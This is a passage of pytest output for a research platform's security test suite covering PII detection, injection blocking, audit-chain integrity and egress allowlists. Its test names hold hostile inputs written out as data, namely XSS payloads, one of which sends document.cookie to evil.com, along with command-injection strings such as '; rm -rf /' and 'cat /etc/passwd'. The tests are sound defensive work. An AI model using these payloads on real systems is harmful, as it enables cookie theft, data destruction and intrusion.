+tests/scripts/test_vector_drift_scheduler.py::test_run_once_calls_check_fn [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_vector_drift_scheduler.py::test_run_once_triggers_reindex_when_needed [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_vector_drift_scheduler.py::test_run_once_no_trigger_when_stable [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_vector_drift_scheduler.py::test_loop_runs_max_iterations [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_vector_drift_scheduler.py::test_loop_returns_schedulerrun_list [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_vector_drift_scheduler.py::test_interval_must_be_positive [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_verify_db_merge.py::test_project_source_reader_repairs_title_commas_and_glued_rows [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_verify_db_merge.py::test_lab_and_funding_source_readers_split_glued_records [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_verify_intake_bundle.py::test_verify_csv_hmacs_accepts_valid_rows [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_verify_intake_bundle.py::test_verify_csv_hmacs_reports_invalid_rows [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_verify_intake_bundle.py::test_verify_bundle_checks_manifest_hash_and_hmac [32mPASSED[0m[31m [ 47%][0m
+tests/security/test_adversarial_inputs.py::TestPIIInjection::test_pii_in_query_sanitized[My Aadhaar is 1234-5678-9012] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestPIIInjection::test_pii_in_query_sanitized[My PAN is ABCDE1234F] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestPIIInjection::test_pii_in_query_sanitized[Call me at 9876543210] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestPIIInjection::test_pii_in_query_sanitized[Email me at test@example.com] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestPIIInjection::test_pii_in_query_sanitized[My Aadhaar: 123456789012] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestPIIInjection::test_pii_in_query_sanitized[PAN: ABCDE1234F] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestPIIInjection::test_pii_in_query_sanitized[Phone: +91-9876543210] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestPIIInjection::test_pii_in_query_sanitized[aadhaar: 1234-5678-9012] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestPIIInjection::test_pii_in_query_sanitized[My VID is 1234-5678-9012-5432] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestPIIInjection::test_bulk_pii_extraction_attempt_blocked [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestXSSBlocking::test_xss_payload_sanitized[<script>alert(1)</script>] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestXSSBlocking::test_xss_payload_sanitized[Hello <img src=x onerror=alert(1)>] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestXSSBlocking::test_xss_payload_sanitized[<svg/onload=alert(1)>] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestXSSBlocking::test_xss_payload_sanitized[Test <iframe src=javascript:alert(1)>] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestXSSBlocking::test_xss_payload_sanitized['; alert(1); var x='] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestXSSBlocking::test_xss_payload_sanitized[{{constructor.constructor('alert(1)')()}}] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestXSSBlocking::test_xss_payload_sanitized[<script>fetch('http://evil.com?c='+document.cookie)</script>] [32mPASSED[0m[31m [ 48%][0m
+tests/security/test_adversarial_inputs.py::TestCommandInjection::test_command_injection_blocked[List files; ls /etc/passwd] [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestCommandInjection::test_command_injection_blocked[Show data && cat /etc/passwd] [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestCommandInjection::test_command_injection_blocked[AI researcher | cat /etc/passwd] [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestCommandInjection::test_command_injection_blocked[Search researchers `whoami`] [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestCommandInjection::test_command_injection_blocked[Test $(whoami)] [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestCommandInjection::test_command_injection_blocked[AI researchers'; rm -rf /] [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestCommandInjection::test_command_injection_blocked[Query researchers\ncat /etc/passwd] [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestTierBypassAttempts::test_tier_1_cannot_access_tier_3_data [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestTierBypassAttempts::test_unauthenticated_access_blocked [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestTierBypassAttempts::test_invalid_token_rejected [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestTierBypassAttempts::test_tier_bypass_query_returns_empty_or_filtered[Show me all admin records] [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestTierBypassAttempts::test_tier_bypass_query_returns_empty_or_filtered[Get tier 0 data] [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestTierBypassAttempts::test_tier_bypass_query_returns_empty_or_filtered[List all restricted documents] [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestTierBypassAttempts::test_tier_bypass_query_returns_empty_or_filtered[Access internal-only research] [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestTierBypassAttempts::test_tier_bypass_query_returns_empty_or_filtered[Bypass tier restriction: admin] [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestDPDPConsent::test_consent_required_before_query [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestDPDPConsent::test_consent_accept_validates [32mPASSED[0m[31m [ 49%][0m
+tests/security/test_adversarial_inputs.py::TestDPDPConsent::test_withdrawal_returns_empty_results [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_adversarial_inputs.py::TestNoEgressLeakage::test_no_data_uri_in_response[data:text/html] [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_adversarial_inputs.py::TestNoEgressLeakage::test_no_data_uri_in_response[data:text/plain] [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_adversarial_inputs.py::TestNoEgressLeakage::test_no_mailto_exfiltration [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_audit_chain.py::TestAuditChain::test_append_generates_hash [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_audit_chain.py::TestAuditChain::test_chain_links [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_audit_chain.py::TestAuditChain::test_verify_passes_clean [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_audit_chain.py::TestAuditChain::test_verify_fails_tampered [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_audit_chain.py::TestAuditChain::test_verify_fails_deleted_event [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_audit_chain.py::TestAuditChain::test_merkle_root [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_audit_chain.py::TestAuditChain::test_all_event_types_logged [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_audit_chain.py::test_module_level_verify [32mPASSED[0m[31m      [ 50%][0m
+tests/security/test_audit_chain.py::TestAuditChainPerUserBinding::test_verify_chain_per_user_passes_fresh_log [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_audit_chain.py::TestAuditChainPerUserBinding::test_verify_chain_per_user_detects_tampered_kid [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_audit_chain.py::TestAuditChainPerUserBinding::test_verify_chain_per_user_detects_tampered_fingerprint [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_audit_chain.py::TestAuditChainPerUserBinding::test_verify_chain_per_user_false_allows_tampered_binding [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_audit_chain.py::TestAuditChainPerUserBinding::test_verify_chain_per_user_system_events_skip_binding [32mPASSED[0m[31m [ 50%][0m
+tests/security/test_audit_chain.py::TestAuditChainPerUserBinding::test_verify_chain_per_user_multiple_users [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_audit_chain.py::TestAuditChainPerUserBinding::test_verify_chain_per_user_empty_log [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_audit_chain.py::TestAuditChainPerUserBinding::test_verify_chain_per_user_mixed_events [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_data_boundary.py::TestDataBoundary::test_no_raw_db_schema_to_llm [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_data_boundary.py::TestDataBoundary::test_vector_metadata_filtered [33mSKIPPED[0m[31m [ 51%][0m
+tests/security/test_data_boundary.py::TestDataBoundary::test_audit_log_created [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_data_boundary.py::TestAccessControl::test_tier1_can_access_all [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_data_boundary.py::TestAccessControl::test_tier2_restricted [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_data_boundary.py::TestAccessControl::test_tier3_most_restricted [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_egress_allowlist.py::TestEgressSchemaAllowlistLoader::test_is_table_allowed_valid [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_egress_allowlist.py::TestEgressSchemaAllowlistLoader::test_is_table_allowed_invalid [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_egress_allowlist.py::TestEgressSchemaAllowlistLoader::test_is_column_allowed_valid [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_egress_allowlist.py::TestEgressSchemaAllowlistLoader::test_is_column_allowed_blocked [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_egress_allowlist.py::TestEgressSchemaAllowlistLoader::test_get_blocked_content_returns_frozenset [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_egress_allowlist.py::TestEgressSchemaAllowlistLoader::test_is_llm_prompt_allowed [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_egress_allowlist.py::TestEgressSchemaAllowlistLoader::test_get_allowed_tables [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_egress_allowlist.py::TestEgressSchemaAllowlistLoader::test_get_table_columns [32mPASSED[0m[31m [ 51%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientAllowed::test_allowed_user_query [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientAllowed::test_allowed_schema_prompt_valid_table [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientAllowed::test_allowed_plan_json [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientAllowed::test_allowed_citation_ids [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientAllowed::test_allowed_session_id [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedTables::test_blocked_unlisted_table_in_schema_prompt [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedTables::test_blocked_unlisted_table_join [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedTables::test_blocked_user_credentials_table [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedTables::test_blocked_passwords_table [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedTables::test_blocked_private_notes_table [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedColumns::test_blocked_email_column [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedColumns::test_blocked_phone_column [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedColumns::test_blocked_full_text_field [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedColumns::test_blocked_fulltext_nested [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedColumns::test_blocked_researcher_table_column_in_schema [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedPatterns::test_blocked_raw_content_field [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedPatterns::test_blocked_raw_db_dump [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedPatterns::test_blocked_publication_text [32mPASSED[0m[31m [ 52%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedPatterns::test_blocked_research_content [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_allowlist.py::TestSovereignHTTPXClientBlockedPatterns::test_blocked_full_publication_record [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_allowlist.py::TestYAMLHotReload::test_reload_on_mtime_change [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_allowlist.py::TestYAMLHotReload::test_singleton_same_instance [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_allowlist.py::TestFalsePositives::test_researcher_name_not_blocked [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_allowlist.py::TestFalsePositives::test_publication_title_not_blocked [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_allowlist.py::TestFalsePositives::test_institution_name_not_blocked [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_allowlist.py::TestFalsePositives::test_complex_query_with_multiple_tables [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_allowlist.py::TestFalsePositives::test_aggregate_query [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_guard.py::TestEgressGuard::test_check_passes_clean_text [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_guard.py::TestEgressGuard::test_blocks_sql_injection_pattern [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_guard.py::TestEgressGuard::test_blocks_schema_probing [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_guard.py::TestEgressGuard::test_blocks_select_star [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_guard.py::TestEgressGuard::test_blocks_credential_in_url [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_guard.py::TestEgressGuard::test_filter_schema_removes_non_allowlisted_tables [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_guard.py::TestEgressGuard::test_filter_schema_keeps_allowlisted [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_guard.py::TestEgressGuard::test_filter_prompt_raises_on_violation [32mPASSED[0m[31m [ 53%][0m
+tests/security/test_egress_guard.py::TestEgressGuard::test_filter_prompt_returns_filtered_on_violation_no_raise [32mPASSED[0m[31m [ 54%][0m
+tests/security/test_egress_guard.py::TestEgressGuard::test_violations_accumulated [32mPASSED[0m[31m [ 54%][0m
+tests/security/test_egress_guard.py::TestEgressGuard::test_singleton [32mPASSED[0m[31m [ 54%][0m
+tests/security/test_egress_guard.py::TestEgressGuard::test_system_prompt_filter [32mPASSED[0m[31m [ 54%][0m
+tests/security/test_egress_guard.py::TestEgressGuard::test_blocks_long_alphanumeric [32mPASSED[0m[31m [ 54%][0m
+tests/security/test_gateway.py::TestGatewaySecurity::test_pii_detection_aadhaar [32mPASSED[0m[31m [ 54%][0m
+tests/security/test_gateway.py::TestGatewaySecurity::test_pii_detection_pan [32mPASSED[0m[31m [ 54%][0m
+tests/security/test_gateway.py::TestGatewaySecurity::test_pii_detection_phone [32mPASSED[0m[31m [ 54%][0m
+tests/security/test_gateway.py::TestGatewaySecurity::test_prompt_injection_detection [32mPASSED[0m[31m [ 54%][0m
+tests/security/test_gateway.py::TestGatewaySecurity::test_sanitisation [32mPASSED[0m[31m [ 54%][0m
+tests/security/test_gateway.py::TestGatewaySecurity::test_kong_gateway_dlp_blocking [33mSKIPPED[0m timeout)[31m [ 54%][0m
+tests/security/test_gateway.py::TestGatewaySecurity::test_kong_gateway_injection_blocking [33mSKIPPED[0m timeout)[31m [ 54%][0m
+tests/security/test_gateway.py::TestGatewaySecurity::test_kong_login_is_public_and_researchers_requires_jwt [33mSKIPPED[0m timeout)[31m [ 54%][0m
+tests/security/test_gateway.py::TestGatewaySecurity::test_query_validation [32mPASSED[0m[31m [ 54%][0m
+tests/security/test_hmac_validation.py::TestHMACValidation::test_invalid_signature_returns_401 [32mPASSED[0m[31m [ 54%][0m
+tests/security/test_hmac_validation.py::TestHMACValidation::test_expired_timestamp_returns_401 [32mPASSED[0m[31m [ 54%][0m
+tests/security/test_hmac_validation.py::TestHMACValidation::test_replay_attack_blocked [32mPASSED[0m[31m [ 54%][0m
+tests/security/test_hmac_validation.py::TestHMACValidation::test_valid_signature_succeeds [32mPASSED[0m[31m [ 55%][0m
+tests/security/test_hmac_validation.py::TestHMACValidation::test_missing_signature_header [32mPASSED[0m[31m [ 55%][0m
+tests/security/test_hmac_validation.py::TestHMACValidation::test_missing_timestamp_header [32mPASSED[0m[31m [ 55%][0m
+tests/security/test_hmac_validation.py::TestHMACValidation::test_future_timestamp_rejected [32mPASSED[0m[31m [ 55%][0m
+tests/security/test_kong_dlp_runtime.py::test_kong_loads_custom_dlp_plugin [33mSKIPPED[0m[31m [ 55%][0m
+tests/security/test_kong_dlp_runtime.py::test_kong_dlp_blocks_pii_and_reports_type[Find researcher with Aadhaar 1234-5678-9012-aadhaar] [33mSKIPPED[0m[31m [ 55%][0m
+tests/security/test_kong_dlp_runtime.py::test_kong_dlp_blocks_pii_and_reports_type[PAN number ABCDE1234F details-pan] [33mSKIPPED[0m[31m [ 55%][0m
+tests/security/test_kong_dlp_runtime.py::test_kong_dlp_blocks_pii_and_reports_type[Contact researcher at 9876543210-phone] [33mSKIPPED[0m[31m [ 55%][0m
+tests/security/test_kong_dlp_runtime.py::test_blocked_request_emits_audit_log [33mSKIPPED[0m[31m [ 55%][0m
+tests/security/test_per_user_audit_binding.py::TestPerUserKeyManager::test_derive_key_consistent_for_same_inputs [32mPASSED[0m[31m [ 55%][0m
+tests/security/test_per_user_audit_binding.py::TestPerUserKeyManager::test_derive_key_differs_across_users [32mPASSED[0m[31m [ 55%][0m
+tests/security/test_per_user_audit_binding.py::TestPerUserKeyManager::test_derive_key_differs_across_kids [32mPASSED[0m[31m [ 55%][0m
+tests/security/test_per_user_audit_binding.py::TestPerUserKeyManager::test_derive_key_differs_across_fingerprints [32mPASSED[0m[31m [ 55%][0m
+tests/security/test_per_user_audit_binding.py::TestPerUserKeyManager::test_derive_key_handles_none_jwt_kid [32mPASSED[0m[31m [ 55%][0m
+tests/security/test_per_user_audit_binding.py::TestPerUserKeyManager::test_derive_key_handles_none_fingerprint [32mPASSED[0m[31m [ 55%][0m
+tests/security/test_per_user_audit_binding.py::TestComputeVerifyBinding::test_binding_validates_correctly [32mPASSED[0m[31m [ 55%][0m
+tests/security/test_per_user_audit_binding.py::TestComputeVerifyBinding::test_binding_rejects_mismatch [32mPASSED[0m[31m [ 55%][0m
+tests/security/test_per_user_audit_binding.py::TestComputeVerifyBinding::test_binding_rejects_tampered_event [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestComputeVerifyBinding::test_binding_rejects_wrong_user [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestComputeVerifyBinding::test_binding_accepts_system_event [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestComputeVerifyBinding::test_binding_rejects_empty_stored [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestRotatingSaltStore::test_get_salt_returns_same_salt_intraday [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestRotatingSaltStore::test_get_salt_differs_across_users [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestRotatingSaltStore::test_get_salt_is_persisted [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestRotatingSaltStore::test_different_dates_produce_different_salts [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestBuildRequestFingerprint::test_same_inputs_produce_same_fingerprint [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestBuildRequestFingerprint::test_different_ip_produces_different_fingerprint [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestBuildRequestFingerprint::test_fingerprint_format [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestBuildRequestFingerprint::test_fingerprint_handle_none_values [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestBuildRequestFingerprint::test_fingerprint_length_reasonable [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestVerifyChainWithPerUserBinding::test_verify_chain_with_valid_per_user_binding_passes [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestVerifyChainWithPerUserBinding::test_verify_chain_detects_tampered_binding [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestVerifyChainWithPerUserBinding::test_verify_chain_without_per_user_check_passes [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestVerifyChainWithPerUserBinding::test_system_event_skips_binding_check [32mPASSED[0m[31m [ 56%][0m
+tests/security/test_per_user_audit_binding.py::TestVerifyChainWithPerUserBinding::test_multiple_events_all_verified [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_per_user_audit_binding.py::TestDatabaseCoSign::test_db_cosign_hmac_is_deterministic_and_tamper_sensitive [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_per_user_audit_binding.py::TestDatabaseCoSign::test_db_cosign_trigger_sql_adds_column_and_insert_trigger [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_per_user_audit_binding.py::TestDatabaseCoSign::test_recent_verify_reports_disabled_when_database_url_missing [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_pii_compliance.py::TestPIICompliance::test_aadhaar_detection [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_pii_compliance.py::TestPIICompliance::test_dpdp_compliance [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_pii_compliance.py::TestPIICompliance::test_email_detection [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_pii_compliance.py::TestPIICompliance::test_fpe_decryption_disabled_by_policy [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_pii_compliance.py::TestPIICompliance::test_fpe_detokenization_requires_token_vault [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_pii_compliance.py::TestPIICompliance::test_fpe_encryption [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_pii_compliance.py::TestPIICompliance::test_pan_detection [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_pii_compliance.py::TestPIICompliance::test_phone_detection [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_pii_compliance.py::TestPIICompliance::test_pii_tokenization [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_pii_compliance.py::TestPIICompliance::test_presidio_analysis [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_pii_indian.py::test_aadhaar_grouped_detected [32mPASSED[0m[31m  [ 57%][0m
+tests/security/test_pii_indian.py::test_aadhaar_dashed_detected [32mPASSED[0m[31m   [ 57%][0m
+tests/security/test_pii_indian.py::test_aadhaar_verhoeff_rejects_invalid_sample_number [32mPASSED[0m[31m [ 57%][0m
+tests/security/test_pii_indian.py::test_pan_detected [32mPASSED[0m[31m              [ 57%][0m
+tests/security/test_pii_indian.py::test_phone_detected [32mPASSED[0m[31m            [ 58%][0m
+tests/security/test_pii_indian.py::test_phone_91_detected [32mPASSED[0m[31m         [ 58%][0m
+tests/security/test_pii_indian.py::test_email_detected [32mPASSED[0m[31m            [ 58%][0m
+tests/security/test_pii_indian.py::test_academic_email_detected [32mPASSED[0m[31m   [ 58%][0m
+tests/security/test_pii_indian.py::test_gstin_detected [32mPASSED[0m[31m            [ 58%][0m
+tests/security/test_pii_indian.py::test_clean_research_query_has_no_pii [32mPASSED[0m[31m [ 58%][0m
+tests/security/test_pii_indian.py::test_indian_pii_scan_budget_covers_all_patterns [32mPASSED[0m[31m [ 58%][0m
+tests/security/test_pii_scan.py::test_scan_detects_aadhaar_with_regex_fallback [32mPASSED[0m[31m [ 58%][0m
+tests/security/test_pii_scan.py::test_scan_works_when_spacy_model_is_available [32mPASSED[0m[31m [ 58%][0m
+tests/security/test_postgresql_rbac.py::test_postgresql_rbac_connects_and_closes [32mPASSED[0m[31m [ 58%][0m
+tests/security/test_postgresql_rbac.py::test_setup_rls_policies [32mPASSED[0m[31m   [ 58%][0m
+tests/security/test_postgresql_rbac.py::test_setup_user_groups [32mPASSED[0m[31m    [ 58%][0m
+tests/security/test_postgresql_rbac.py::test_setup_rls_policies_rollback_on_error [32mPASSED[0m[31m [ 58%][0m
+tests/security/test_prompt_injection.py::TestPromptInjection::test_sql_injection_blocked [32mPASSED[0m[31m [ 58%][0m
+tests/security/test_prompt_injection.py::TestPromptInjection::test_system_prompt_leak [32mPASSED[0m[31m [ 58%][0m
+tests/security/test_prompt_injection.py::TestPromptInjection::test_malicious_queries_safe [32mPASSED[0m[31m [ 58%][0m
+tests/security/test_prompt_sanitiser_middleware.py::test_prompt_sanitiser_uses_client_host_by_default [32mPASSED[0m[31m [ 58%][0m
+tests/security/test_prompt_sanitiser_middleware.py::test_prompt_sanitiser_can_trust_forwarded_for_when_enabled [32mPASSED[0m[31m [ 59%][0m
+tests/security/test_qdrant_rbac.py::test_create_access_filter_tier1 [32mPASSED[0m[31m [ 59%][0m
+tests/security/test_qdrant_rbac.py::test_create_access_filter_tier2 [32mPASSED[0m[31m [ 59%][0m
+tests/security/test_qdrant_rbac.py::test_create_access_filter_tier3 [32mPASSED[0m[31m [ 59%][0m
+tests/security/test_qdrant_rbac.py::test_create_access_filter_invalid_tier [32mPASSED[0m[31m [ 59%][0m
+tests/security/test_qdrant_rbac.py::test_validate_access [32mPASSED[0m[31m          [ 59%][0m
+tests/security/test_qdrant_rbac.py::test_filter_search_results [32mPASSED[0m[31m    [ 59%][0m
+tests/security/test_qdrant_rbac.py::test_inject_access_filter_no_existing [32mPASSED[0m[31m [ 59%][0m
+tests/security/test_qdrant_rbac.py::test_inject_access_filter_with_existing [32mPASSED[0m[31m [ 59%][0m
+tests/security/test_qdrant_rbac.py::test_setup_collection_security_logs [32mPASSED[0m[31m [ 59%][0m
+tests/security/test_qdrant_rbac.py::test_test_access_isolation [32mPASSED[0m[31m    [ 59%][0m
+tests/security/test_rate_limit_enforced.py::TestRateLimitEnforced::test_rate_limit_101st_request_returns_429 [33mSKIPPED[0m[31m [ 59%][0m
+tests/security/test_rate_limit_enforced.py::TestRateLimitEnforced::test_rate_limit_resets_after_window [32mPASSED[0m[31m [ 59%][0m
+tests/security/test_rate_limit_enforced.py::TestRateLimitEnforced::test_different_users_have_separate_limits [32mPASSED[0m[31m [ 59%][0m
+tests/security/test_rate_limit_enforced.py::TestRateLimitEnforced::test_rate_limit_headers_present [32mPASSED[0m[31m [ 59%][0m
+tests/security/test_rate_limit_enforced.py::TestRateLimitEnforced::test_rate_limit_response_body 
